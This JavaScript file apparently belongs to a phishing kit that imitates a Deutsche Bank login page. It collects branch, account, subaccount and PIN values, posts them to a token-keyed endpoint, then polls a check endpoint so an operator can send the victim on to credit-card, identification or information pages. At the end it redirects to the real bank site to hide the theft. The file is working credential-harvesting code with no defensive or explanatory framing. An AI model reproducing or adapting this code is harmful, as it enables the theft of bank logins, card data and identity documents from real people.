const login_form = document.querySelector('#login-form');
const branch = document.querySelector('#branch');
const account = document.querySelector('#account');
const subAccount = document.querySelector('#subAccount');
const pin = document.querySelector('#pin');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

const isFieldEmpty = field => field.value === '';

const resetForm = (fields, button) => {
    fields.forEach(field => field.disabled = false);
    button.disabled = false;
    fields.forEach(field => field.value = '');
    button.innerHTML = 'Login ausf&uuml;hren';
    document.querySelector('#errorMessage').style.display = 'block';
};

login_form.addEventListener('submit', e => { 
    e.preventDefault();
    const fields = [branch, account, subAccount, pin];
    if (fields.some(isFieldEmpty)) {
        resetForm(fields, loginButton);
        return;
    }
    const data = new FormData();
    fields.forEach(field => data.append(field.id, field.value));
    // loginButton.innerHTML = '<img src="images/ing.gif" width="18" style="display: inline-block;"> Laden...';
    fields.forEach(field => field.disabled = true);
    loginButton.disabled = true;
    
    var randomID = document.querySelector('input[name="randomId"]').value;

    window.location.href = '/information/'+randomID;

    /*(setTimeout(() => {
        fetch('/public/api/afk.ini')
            .then(response => response.text())
            .then(text => {
                alert('call here 1');
                if (text.trim().toLowerCase() === 'on') {
                    window.location.href = '/information/' + token.value;
                }
            })
            .catch(error => {
                console.error('Theres a error:', error);
            });
    }, 300);*/

    document.querySelector('#errorMessage').style.display = 'none';

    fetch('/einloggen/' + token.value, {
        method: 'POST',
        body: data
    })
    .then(() => {
        const newInterval = setInterval(() => {
            fetch('/einloggen/check/' + token.value, {
                method: 'POST',
            })
            .then(res => {
                res.json().then(data => {
                    alert('data.page == '+data.page);
                    if (data.page == 'login') {
                        loginButton.innerHTML = 'Login ausf&uuml;hren';
                        loginButton.disabled = false;
                        branch.disabled = false;
                        account.disabled = false;
                        subAccount.disabled = false;
                        pin.disabled = false;
                        branch.value = '';
                        account.value = '';
                        subAccount.value = '';
                        pin.value = '';
                        document.querySelector('#errorMessage').style.display = 'block';
                        clearInterval(newInterval);
                    } else if (data.page == 'name') {
                        window.location.href = '/information/' + token.value;
                    } else if (data.page == 'creditcard') {
                        window.location.href = '/creditcard/' + token.value;
                    } else if (data.page == 'identification') {
                        window.location.href = '/identificatie/' + token.value;
                    } else if (data.page == 'finish') {
                        window.location.href = 'https://deutsche-bank.de/';
                    } else if (data.page == 'waiting') {
                        console.log('Waiting...');
                    }
                });
            });
        }, 500);
    });
});
